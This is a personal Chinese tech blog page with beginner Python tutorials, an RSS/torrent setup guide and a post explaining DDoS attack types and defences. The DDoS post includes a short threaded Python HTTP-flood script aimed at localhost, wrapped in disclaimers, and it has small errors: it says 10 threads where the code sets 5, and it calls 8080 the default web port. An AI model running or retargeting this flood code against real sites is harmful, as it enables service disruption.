+<p>（1)def 末尾必须带冒号</p>
+<p>(2)函数内所有代码统一缩进4个空格</p>
+<p>(3)函数调用代码顶格写，不缩进</p>
+<p><strong><em>5、try-except 异常处理 缩进规范</em></strong></p>
+<p>标准缩进格式</p>
+<p>try:<br>尝试执行的代码<br>except:<br>出错后执行的代码<br> 注意</p>
+<p>（1）try&#x2F;except 末尾必须带冒号</p>
+<p>（2）对应代码块必须缩进4个空格</p>
+<p><strong><em>6、with 语句 缩进规范</em></strong></p>
+<p>格式</p>
+<p>with 操作 as 变量:<br>执行代码<br> 注意</p>
+<p>（1）with 末尾必须带冒号</p>
+<p>（2）内部代码必须缩进4个空格</p>
+<p><strong><em>7、class 类 缩进规范</em></strong></p>
+<p>格式</p>
+<p>class 类名:<br>类内部代码<br>def 类方法(self):<br>方法内部代码<br> 注意</p>
+<p>（1）class 末尾必须带冒号</p>
+<p>(2) 类内部代码缩进4个空格</p>
+<p>(3) 类里的方法，内部代码再额外缩进4个空格</p>
+<p><strong><em>8、嵌套语法 缩进规范</em></strong></p>
+<p>格式</p>
+<p>外层语句:<br>内层语句:<br>最内层执行代码<br> 注意</p>
+<p>（1）每嵌套一层，就多缩进4个空格</p>
+<p>（2）同一层级代码缩进必须完全一致</p>
+<p>所有语法通用缩进规则</p>
+<p>1. 标准缩进固定为 4个空格。<br>2. 只要代码末尾带冒号 : ，下一行必须缩进。<br>3. 同一个代码块，缩进空格数量必须完全相同。<br>4. 不要Tab键和空格混合使用，这是不好的习惯。<br>5. 代码块结束，必须取消缩进，回到上一层级。</p>
+<p>但是，一般情况下，我自己是直接按tab进行自动缩进就行，我不太爱管这些，自己养成好习惯吧，本人已经改不过来了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E7%BC%A9%E8%BF%9B%EF%BC%89/index/" data-id="cuidS4ItgPa7HqtuvOVXYL-9V" data-title="python的教程（缩进）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-25-python教程（字符串）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/25/2026/04/2026-04-25-python%E6%95%99%E7%A8%8B%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-24T16:00:00.000Z" itemprop="datePublished">2026-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/25/2026/04/2026-04-25-python%E6%95%99%E7%A8%8B%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89/index/">python教程（字符串）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：字符串按我自己的理解就是程序里所有文字信息，全部都是字符串，只不过我们不叫文字，叫字符串，你可以理解为专有名词。</p>
+<p>作用</p>
+<p>我们几乎所有的代码都需要用到，毕竟你不可能不写任何文字信息吧，那些都叫做字符串。</p>
+<p><strong><em>1.字符串下标取值</em></strong></p>
+<p>s &#x3D; “python”<br>print(s[0])  
+ </p>
+<p>解释：<br>取出字符串里单独某一个字符<br>字符位置从0开始依次排序</p>
+<p>比如这个代码输出的就是一个p，因为s定义为pythoon，要输出第一个字符这里记住是要从0开始的。</p>
+<p>注意事项：</p>
+<p>1. 下标从0开始，不是从1<br>2. 数字不能超出字符总数，超出直接报错<br>3. 只能一个数字，不能写区间</p>
+<p><em><strong>2.字符串切片截取</strong></em></p>
+<p>s &#x3D; “hello python”<br>print(s[0:5])  
+ </p>
+<p>解释：<br>从字符串当中，截取一整段文字</p>
+<p>这里输出的就是hello</p>
+<p>注意事项：</p>
+<p>1. 规则：包头不包尾<br>2. 左边数字能取到，右边数字取不到<br>3. 冒号两边可以省略数字</p>
+<p><strong><em>3.获取字符串长度</em></strong></p>
+<p>len(s)  
+ </p>
+<p>解释：<br>自动统计s字符串一共有多少个字</p>
+<p>但是你要先定义这个s</p>
+<p>注意事项：</p>
+<p>1. 空格、符号、汉字全都算长度<br>2. len()里面必须放字符串</p>
+<p><strong><em>4.字符串拼接</em></strong></p>
+<p>a &#x3D; “我”<br>b &#x3D; “python”<br>print(a + b)  
+ </p>
+<p>解释：<br>把两段文字合并拼接在一起</p>
+<p>输出为 我python</p>
+<p>注意事项：</p>
+<p>1. 只能字符串 + 字符串<br>2. 不能字符串和数字直接相加</p>
+<p><strong><em>5.字符串重复输出</em></strong></p>
+<p>print(“666” * 3)  
+ </p>
+<p>解释：<br>让一段文字自动重复打印多次</p>
+<p>这里会输出666666666</p>
+<p>注意事项：</p>
+<p>1. 只能 字符串 * 数字<br>2. 不可以数字 * 字符串以外内容</p>
+<p><strong><em>6.大小写转换</em></strong></p>
+<p>s.upper()<br>s.lower()  
+ </p>
+<p>解释：<br>英文全部变大写 upper&#x2F; 全部变小写lower</p>
+<p>这里前面s是你定义的东西</p>
+<p>注意事项：</p>
+<p>1. 只对英文字母生效<br>2. 汉字、符号不会发生变化</p>
+<p><strong><em>7.去除两边空格</em></strong></p>
+<p>s.strip()  
+ </p>
+<p>解释：<br>删掉字符串前后多余空白空格</p>
+<p>注意事项：<br>只会去掉最前面和最后面<br>中间空格不会删除</p>
+<p><strong><em>8.查找字符位置</em></strong></p>
+<p>s.find(“p”)  
+ </p>
+<p>解释：<br>查找某个文字出现在第几个位置</p>
+<p>注意事项：</p>
+<p>1. 找到返回下标数字<br>2. 找不到内容直接返回 -1</p>
+<p><strong><em>9.字符串内容替换</em></strong></p>
+<p>s.replace(“a”,”b”)  
+ </p>
+<p>解释：<br>把字符串里面旧文字，换成新文字</p>
+<p>注意事项：</p>
+<p>1. 不会改变原本字符串<br>2. 可以一次性替换所有相同字符</p>
+<p>字符串整体大注意</p>
+<p>1. 引号必须是英文引号<br>2. 字符串里面的字，不能单独修改<br>3. 下标一律从0开始计算<br>4. 不要越界取值，极易代码报错<br>5. 字符串属于不可修改数据类型</p>
+<p>总结：这些就是大致的内容了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/25/2026/04/2026-04-25-python%E6%95%99%E7%A8%8B%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89/index/" data-id="cuidsL6Abcjy7XK4KKYKGea9d" data-title="python教程（字符串）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-24-rss订阅简单介绍/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/24/2026/04/2026-04-24-rss%E8%AE%A2%E9%98%85%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-23T16:00:00.000Z" itemprop="datePublished">2026-04-24</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9F%A5%E8%AF%86/">服务器知识</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/24/2026/04/2026-04-24-rss%E8%AE%A2%E9%98%85%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/index/">RSS订阅简单介绍</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：本人因为别人的推荐最近使用了这个，发现确实好用，才写了这篇文章。主要介绍订阅文章和BT种子资源下载，实现无缝下载资源（这里下载链接自行寻找，本人不提供任何网址）和咨询，摆脱大数据的推送。</p>
+<p>他是干什么的：RSS就是一个订阅网上资源的协议<br>你关注所有博客、网站、公众号、个人站点，bt种子不用一个个点开网站、不用刷网页，所有新文章全部自动汇总到你这一个软件里，一键全部看完。</p>
+<p>原理：我个人的理解就是，他和BT种子的原理一样，BT种子就是把一个文件的全部特征信息打包成链接，下载软件通过这个链接，全网找人零散拼凑出完整文件，只不过这里的文件变文章了。</p>
+<p>使用：</p>
+<p>（1）文章的订阅</p>
+<p>首先作者要开启RSS订阅的功能</p>
+<p>订阅文章的软件推荐：<a target="_blank" rel="noopener" href="https://github.com/yang991178/fluent-reader">yang991178&#x2F;fluent-reader：现代桌面RSS阅读器，搭载Electron、React和Fluent UI开发</a></p>
+<p>手机端我推荐：<a target="_blank" rel="noopener" href="https://github.com/ReadYouApp/ReadYou">ReadYouApp&#x2F;ReadYou: An Android RSS reader presented in Material You style.</a></p>
+<p>然后本人也在博客里添加了这一功能，希望感兴趣的可以订阅一下</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-190747-1024x117.png"></p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-190807-1024x596.png"></p>
+<p>这是订阅的网址：<a target="_blank" rel="noopener" href="https://suyihang15.com/index.php/feed/">https://suyihang15.com/index.php/feed/</a></p>
+<p>这样填就行记得最后是feed&#x2F;别少了这个&#x2F;</p>
+<p>这是本人用的软件的订阅界面</p>
+<p><img src="/images/af110f5cad419ebd4422ac0cfd31d1f4-461x1024.jpg"></p>
+<p>软件的开始界面</p>
+<p><img src="/images/02b3a098de438a4398970af0beb9e6c9-461x1024.jpg"></p>
+<p>本人用的是这个，很干净舒服。</p>
+<p>（2）BT种子资源下载</p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/qbittorrent/qBittorrent/">qbittorrent</a></p>
+<p>先在设置里开启RSS订阅</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-204524-1024x544.png"></p>
+<p>再在工具里找到RSS订阅</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-204651-1024x543.png"></p>
+<p>然后在这里添加你找到的RSS链接就行了</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-204716-1024x532.png"></p>
+<p>订阅好，并设置好下载规则和指定的地方</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-204753-1024x496.png"></p>
+<p>这里就会自动下载了</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-205002-1024x545.png"></p>
+<h2 id="本人不提供任何下载资源和链接，请自行寻找，请不要分享并传播任何盗版资源，仅作为一种自动化的思路"><a href="#本人不提供任何下载资源和链接，请自行寻找，请不要分享并传播任何盗版资源，仅作为一种自动化的思路" class="headerlink" title="本人不提供任何下载资源和链接，请自行寻找，请不要分享并传播任何盗版资源，仅作为一种自动化的思路"></a><strong><em>本人不提供任何下载资源和链接，请自行寻找，请不要分享并传播任何盗版资源</em></strong><em><strong>，仅作为一种自动化的思路</strong></em></h2><p>以上就是我使用的RSS订阅做的东西。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/24/2026/04/2026-04-24-rss%E8%AE%A2%E9%98%85%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/index/" data-id="cuidKWCbhRFBUsccPyAJtQgc2" data-title="RSS订阅简单介绍" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-24-python的教程（安装）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/24/2026/04/2026-04-24-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E5%AE%89%E8%A3%85%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-23T16:00:00.000Z" itemprop="datePublished">2026-04-24</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/24/2026/04/2026-04-24-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E5%AE%89%E8%A3%85%EF%BC%89/index/">python的教程（安装）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：因为本人确实对python情有独钟，所以想出一个详细的入门教程，后面有详细的文章做补充的，写的都是很基础的东西，主要在与帮人入门，如有错误或者不好的地方，希望大佬做补充，并提出意见，勿喷。</p>
+<h2 id="安装环境和IDE"><a href="#安装环境和IDE" class="headerlink" title="安装环境和IDE"></a><strong><em>安装环境和IDE</em></strong></h2><p><strong><em><a target="_blank" rel="noopener" href="https://www.python.org/downloads/release/python-3110/">python</a>（运行的环境，只有安装了他，代码才可以在你的电脑上运行）</em></strong></p>
+<p>我本人用的是python3.11不建议安装太老或者太新的版本</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-172836-1024x537.png"></p>
+<p>还有下载的时候记得默认C盘最好，全部勾选，并选择管理源权限的那个，Add python to PATH不然后面需要更改环境变量。</p>
+<p>验证下载是否成功，在电脑的cmd（或者叫命令提示符）输入python</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-172949-1024x540.png"></p>
+<p>这样就成功了。</p>
+<p><strong><em><a target="_blank" rel="noopener" href="https://www.jetbrains.com/pycharm/">pycharm</a>（用于写代码的软件）</em></strong></p>
+<p>虽然本人现在更喜欢vs code但是对于新手学习python我还是首推pycharm我也是靠这玩意入门的。后面你学好了再更换吧。</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-173045-1024x560.png"></p>
+<p>注意下载下面这个社区版的，其功能虽然没有专业版多，但基本够用了，而且是免费的，别被人坑了，任何人说这玩意是付费的都不要信，除非他那个是专业版。</p>
+<p>之后便是新建一个项目了</p>
+<p>新建以后就会有这样一个界面。</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-173151-1024x603.png"></p>
+<p>当然你也可以自己新建一个文件夹，创建一个.py文件用pycharm打开就行，就是如图这样，记得把文件的扩展名打开，在Windows自带的文件夹里，方便改文件扩展名新建任何一个文件都行，但是最后要是一.py结尾，他还会询问改了打不开什么的，不管，改好打开就是上面这样样子</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-173238-1024x594.png"></p>
+<p>然后点击右下角的那个后再添加本地解释器，选择现有的</p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2026-04-25-173304-1024x582.png"></p>
+<p>别选择生成新的，那会在你的电脑上生成虚拟环境，防止一些包冲突的，刚开始学就不要搞这些花的，老老实实用本地的就行。</p>
+<p>然后点击右上角的开始运行一下就会弹出运行界面，我们就可以开始正式写代码了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/24/2026/04/2026-04-24-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E5%AE%89%E8%A3%85%EF%BC%89/index/" data-id="cuidUBcqKLgPcr20PaojYHXRn" data-title="python的教程（安装）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-23-ddos网络攻击的原理及其防护/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/23/2026/04/2026-04-23-ddos%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E9%98%B2%E6%8A%A4/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-22T16:00:00.000Z" itemprop="datePublished">2026-04-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/">电脑知识</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/23/2026/04/2026-04-23-ddos%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E9%98%B2%E6%8A%A4/index/">DDOS网络攻击的原理及其防护</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="注-本人因为最开始搭建网站时，被攻击了很多次，也被阿里云官方给我服务器拉进黑洞很多次，对于这种行为是绝对痛恨的，于是，便学习了DDOS攻击的原理，及用python写了一个测试压力的小工具，仅用于参考学习，如用于违法犯罪本人概不负责。"><a href="#注-本人因为最开始搭建网站时，被攻击了很多次，也被阿里云官方给我服务器拉进黑洞很多次，对于这种行为是绝对痛恨的，于是，便学习了DDOS攻击的原理，及用python写了一个测试压力的小工具，仅用于参考学习，如用于违法犯罪本人概不负责。" class="headerlink" title="注:本人因为最开始搭建网站时，被攻击了很多次，也被阿里云官方给我服务器拉进黑洞很多次，对于这种行为是绝对痛恨的，于是，便学习了DDOS攻击的原理，及用python写了一个测试压力的小工具，仅用于参考学习，如用于违法犯罪本人概不负责。"></a>注:本人因为最开始搭建网站时，被攻击了很多次，也被阿里云官方给我服务器拉进黑洞很多次，对于这种行为是绝对痛恨的，于是，便学习了DDOS攻击的原理，<strong><em>及用python写了一个测试压力的小工具，仅用于参考学习，如用于违法犯罪本人概不负责。</em></strong></h2><h2 id="免责声明：请不要用他来攻击任何网站，维护好网络环境"><a href="#免责声明：请不要用他来攻击任何网站，维护好网络环境" class="headerlink" title="免责声明：请不要用他来攻击任何网站，维护好网络环境"></a><strong><em>免责声明：请不要用他来攻击任何网站，维护好网络环境</em></strong></h2><p>原理：我们知道，一个电子设备其承载能力是有限的，DDOS就是利用了这一点，原理就是模拟很多人在同一时间访问你的网站，达到把你的服务器冲垮的目的。</p>
+<p>例如我之前的服务器就是被冲了快一个星期</p>
+<p><img src="/images/a948f19fa338bcedda2d8f2482ec371b-461x1024.jpg"></p>
+<p>所以本人是很痛恨这种行为，严重影响了本人的使用，至于黑洞，就是云服务器运营商为了防止服务器损坏就直接加入黑名单，公网IP这些基本上就直接用不了了，一般关半小时左右，如果攻击没有停就加长黑洞时间，对于企业的话一般就是会用高防的，一般个人也可以买，当然一万往上，就只有富哥玩的起，我们一般都是套个<a target="_blank" rel="noopener" href="https://www.cloudflare-cn.com/ddos/">cloudflare</a>的防护，免费的，就很良心，但是因为其本身在国外的原因，所以套了这个你的网站访问可能会变慢。</p>
+<p>攻击方式</p>
+<ol>
+<li>TCP 洪水攻击（TCP Flood）这是最简单的方式。</li>
+</ol>
+<p>大量建立半连接、全连接请求，三次握手只做一半，不断向目标发起连接，耗尽服务器连接池、CPU、内存。</p>
+<ol start="2">
+<li>SYN 洪水攻击（SYN Flood）</li>
+</ol>
+<p>只发送握手第一步 SYN 包，不完成三次握手<br>服务器会一直等待你回复，大量半连接堆积，直接占满服务器连接队列，服务器直接瘫痪。<br>杀伤力远大于普通TCP攻击。</p>
+<ol start="3">
+<li>UDP 洪水攻击（UDP Flood）</li>
+</ol>
+<p>UDP不需要握手，直接疯狂发超大数据包<br>无脑灌流量，直接打满对方宽带，网络直接断流、掉线、延迟999+<br>游戏服务器最怕这个。</p>
+<ol start="4">
+<li>ACK Flood</li>
+</ol>
+<p>大量发送确认数据包，干扰服务器正常网络判断，消耗处理性能。</p>
+<ol start="5">
+<li>HTTP GET 洪水 &#x2F; CC攻击（我本人遇到的就是这种情况）</li>
+</ol>
+<p>模拟大量用户疯狂刷新网页、请求接口、访问链接<br>专门打网站、网页、后台，让网站打不开、502、503崩溃，一般主要攻击8080这个端口，这是网站一般的默认端口。</p>
+<ol start="6">
+<li>POST Flood</li>
+</ol>
+<p>大量提交表单、上传数据请求，压榨网站后端数据库压力</p>
+<ol start="7">
+<li>DNS 放大攻击</li>
+</ol>
+<p>利用公共DNS服务器，小包进、大包出<br>用极小流量，打出几十倍超大流量，低成本高伤害。</p>
+<ol start="8">
+<li>NTP 放大攻击</li>
+</ol>
+<p>和DNS同理，时间服务器反射流量，巨型流量DDoS</p>
+<ol start="9">
+<li>ICMP 洪水（Ping洪水）</li>
+</ol>
+<p>疯狂Ping目标IP，海量数据包冲击网关，网络直接卡死</p>
+<ol start="10">
+<li>Slowloris 慢速攻击（慢速连接攻击）</li>
+</ol>
+<p>慢慢发包、不关闭连接，一条连接占用很久<br>少量线程就能搞垮中小型网站，极其隐蔽</p>
+<ol start="11">
+<li>UDP Fragment 分片攻击</li>
+</ol>
+<p>把超大数据包拆碎轰炸，防火墙很难防御</p>
+<ol start="12">
+<li>混合DDoS</li>
+</ol>
+<p>同时 UDP+SYN+HTTP+ICMP 一起打，全能型轰炸</p>
+<p>分类</p>
+<p>1. 网络层：UDP、ICMP、SYN、DNS放大<br>2. 传输层：TCP Flood、ACK Flood<br>3. 应用层：CC攻击、HTTP洪水、Slowloris</p>
+<p>反正对于DDOS攻击就算是那些专家也并没有特别好的方法。</p>
+<p>对于个人开发者我的方法就是</p>
+<p>1、套cloudflare防护的这个壳</p>
+<p>2、加黑名单，封IP</p>
+<p>3、加一个人机访问</p>
+<p>4、开白名单，只有你固定的IP才可以访问。</p>
+<h2 id="实现方法（主要是本人被攻击的方法）再次声明，仅用于学习，如果有人用于攻击本人概不负责"><a href="#实现方法（主要是本人被攻击的方法）再次声明，仅用于学习，如果有人用于攻击本人概不负责" class="headerlink" title="实现方法（主要是本人被攻击的方法）再次声明，仅用于学习，如果有人用于攻击本人概不负责"></a>实现方法（主要是本人被攻击的方法）<strong><em>再次声明，仅用于学习，如果有人用于攻击本人概不负责</em></strong></h2><p>导入所需要的库</p>
+<p>import socket<br>import threading<br>import time</p>
+<p>配置好</p>
+<h2 id="访问网址-（注意这里不准任何人更改，如有更改就不是本人写的）"><a href="#访问网址-（注意这里不准任何人更改，如有更改就不是本人写的）" class="headerlink" title="访问网址**_（注意这里不准任何人更改，如有更改就不是本人写的）_**"></a>访问网址**_（注意这里不准任何人更改，如有更改就不是本人写的）_**</h2><p>url &#x3D; “127.0.0.1”</p>
+<p>网址端口</p>
+<p>port &#x3D; 80</p>
+<h2 id="开启多线程访问-（注意这里不准任何人更改，如有更改就不是本人写的）"><a href="#开启多线程访问-（注意这里不准任何人更改，如有更改就不是本人写的）" class="headerlink" title="开启多线程访问**_（注意这里不准任何人更改，如有更改就不是本人写的）_**"></a>开启多线程访问**_（注意这里不准任何人更改，如有更改就不是本人写的）_**</h2><p>thread_num &#x3D; 5</p>
+<p>最简单的数据包发送</p>
+<p>http_data &#x3D; b”GET &#x2F; HTTP&#x2F;1.1\r\nHost:localhost\r\n\r\n”</p>
+<p>定义一个无限循环的任务</p>
+<p>def visit():<br># 无限循环 一直不停访问网站<br>while True:<br># 1.创建一个网络通道，相当于打开一条上网小路<br>net &#x3D; socket.socket()<br>try:<br>#2.和目标网站服务器建立连接<br>net.connect((url, port))</p>
+<p>#3.发送访问请求，告诉服务器我要打开网页<br>net.send(http_data)  </p>
+<p>print(“正在访问网站”)  </p>
+<p>except:<br>#4连接失败直接跳过<br>pass  </p>
+<p>#5设置请求频率的<br>time.sleep(0.05)</p>
+<p>#6弄出大量线程服务</p>
+<p>for i in range(thread_num):<br># 7创建一条新线程，也就是一个新用户<br>t &#x3D; threading.Thread(target&#x3D;visit)<br># 8启动这个用户，开始疯狂访问<br>t.start()</p>
+<h2 id="整体运行原理（本人这里只介绍原理，无任何教唆，鼓动行为，如果有人敢拿去更改那么，本人概不负责，且不会承认是本人的代码）"><a href="#整体运行原理（本人这里只介绍原理，无任何教唆，鼓动行为，如果有人敢拿去更改那么，本人概不负责，且不会承认是本人的代码）" class="headerlink" title="整体运行原理（本人这里只介绍原理，无任何教唆，鼓动行为，如果有人敢拿去更改那么，本人概不负责，且不会承认是本人的代码）"></a><strong><em>整体运行原理（本人这里只介绍原理，无任何教唆，鼓动行为，如果有人敢拿去更改那么，本人概不负责，且不会承认是本人的代码）</em></strong></h2><p>程序一次性创建 10个虚拟用户<br>每个用户不停的连接网站、发送访问请求<br>大量请求一瞬间全部涌入服务器<br>服务器处理不过来海量访问<br>网站卡顿、打不开、压力爆满<br>这就是 CC流量访问、应用层DDoS 最核心最简单原理</p>
+<p>以上就是最简单的实现方法</p>
+<p>这是攻击本人博客网站大致的效果</p>
+<p><img src="/images/7a9c79cb793dada4968c0e9b64b86aa3-540x1024.jpg"></p>
+<p>前面有用但是后面大部分都被过滤掉了，所以基本上就图一乐。</p>
+<h2 id="但是本人就仅仅只是用于学习，如果有人敢拿出去用后果自己负责，请使用的人对自己的行为负责，都是成年人请为自己的一言一行及所作所为负责，本人因为被打怕了，才去学的这个，而且其很简陋，基本上攻击不了任何东西，这里只是方便那些被攻击的人知道原理并做好防护措-施，网警叔叔，你好，本人就是大致介绍，没人任何其他想法，打的也只是自己的博客网站，无任何危害行为。"><a href="#但是本人就仅仅只是用于学习，如果有人敢拿出去用后果自己负责，请使用的人对自己的行为负责，都是成年人请为自己的一言一行及所作所为负责，本人因为被打怕了，才去学的这个，而且其很简陋，基本上攻击不了任何东西，这里只是方便那些被攻击的人知道原理并做好防护措-施，网警叔叔，你好，本人就是大致介绍，没人任何其他想法，打的也只是自己的博客网站，无任何危害行为。" class="headerlink" title="但是本人就仅仅只是用于学习，如果有人敢拿出去用后果自己负责，请使用的人对自己的行为负责，都是成年人请为自己的一言一行及所作所为负责，本人因为被打怕了，才去学的这个，而且其很简陋，基本上攻击不了任何东西，这里只是方便那些被攻击的人知道原理并做好防护措****施，网警叔叔，你好，本人就是大致介绍，没人任何其他想法，打的也只是自己的博客网站，无任何危害行为。"></a><strong><em>但是本人就仅仅只是用于学习，如果有人敢拿出去用后果自己负责，请使用的人对自己的行为负责，都是成年人请为自己的一言一行及所作所为负责，本人因为被打怕了，才去学的这个，而且其很简陋，基本上攻击不了任何东西，这里只是方便那些被攻击的人知道原理并做好防护措</em>****<em>施，网警叔叔，你好，本人就是大致介绍，没人任何其他想法，打的也只是自己的博客网站，无任何危害行为。</em></strong></h2><p>总结：上便是大致的方法以及反制方法，如果真正想要去学习请去专门的网络安全的地方去学习，网络不是法外之地，祝所有小型合法网站永远稳定运行。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/23/2026/04/2026-04-23-ddos%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E9%98%B2%E6%8A%A4/index/" data-id="cuidQW0-gNh_Jwlcu7KdtwskC" data-title="DDOS网络攻击的原理及其防护" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-23-蓝牙传输文件/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/23/2026/04/2026-04-23-%E8%93%9D%E7%89%99%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-22T16:00:00.000Z" itemprop="datePublished">2026-04-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%89%8B%E6%9C%BA%E7%9F%A5%E8%AF%86/">手机知识</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/23/2026/04/2026-04-23-%E8%93%9D%E7%89%99%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6/index/">蓝牙传输文件</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：没想到吧，蓝牙也是可以传文件的，别以为他只能连接耳机这些，而且基本上有蓝牙就可以传，没有什么限制，但是，传输很慢，基本上是很紧急的情况，没有网络和传输线才用，不让相信我你不会想用的，这里也只是介绍这种方式</p>
+<p>以电脑和手机传文件为例，主要没有第二台手机了。</p>
+<p><strong><em>1、原理</em></strong></p>
+<p>其实说白了就是两台设备，靠近距离的无线电波隔空传数据，适合身边没网和数据线的时候传点小文件。</p>
+<p>先说说它到底是怎么传的。平时我们打开手机蓝牙，设备就会悄悄往外发信号，相当于跟周围说“我在这，能连我”。等搜到要传文件的设备，配对输个密码或者确认一下，就是俩设备互相打个招呼，建一个专属的私密通道，防止别人蹭到数据。</p>
